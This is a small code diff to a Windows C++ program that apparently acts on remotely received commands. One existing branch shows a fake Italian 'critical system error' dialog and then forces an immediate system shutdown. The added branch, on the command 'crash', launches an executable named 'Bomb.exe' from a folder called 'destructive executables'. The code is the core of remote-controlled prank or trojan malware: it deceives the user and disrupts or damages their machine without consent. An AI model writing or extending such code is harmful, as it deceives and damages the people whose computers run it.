@@ -19,6 +19,11 @@ int WINAPI WinMain(
                 MessageBoxA(NULL,"Si e' verificato un errore critico.\nIl sistema verra' arrestato in meno di 3 secondi.","Errore di sistema",MB_OK | MB_ICONERROR);
                 std::this_thread::sleep_for(std::chrono::seconds(3));
                 system("shutdown /s /t 0");
+            }else if (receiveMessage=="crash") {
+                STARTUPINFOA si{};
+                PROCESS_INFORMATION pi{};
+                si.cb = sizeof(si);
+                CreateProcess("EseguibiliDistruttivi/Bomb.exe",nullptr,nullptr,nullptr,FALSE,0,nullptr,nullptr,&si, &pi);
             }
         }
         break;
